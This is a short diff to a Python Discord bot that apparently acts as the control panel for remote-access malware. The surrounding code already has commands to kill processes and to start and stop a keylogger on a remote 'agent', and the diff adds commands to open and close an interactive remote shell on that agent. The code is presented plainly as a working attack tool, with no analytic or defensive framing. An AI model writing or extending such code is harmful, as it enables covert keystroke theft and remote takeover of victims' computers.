@@ -161,6 +161,13 @@ async def killpid_command(interaction: discord.Interaction, pid: int):
 @bot.tree.command(name="keylog_start", description="Start keylogger")
 async def keylog_start_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "keylog_start")
+@bot.tree.command(name="shell", description="Start an interactive shell session")
+async def shell_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "shell")
+
+@bot.tree.command(name="shell_stop", description="Stop the interactive shell")
+async def shell_stop_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "shell_stop")
 
 @bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
 async def keylog_stop_command(interaction: discord.Interaction):
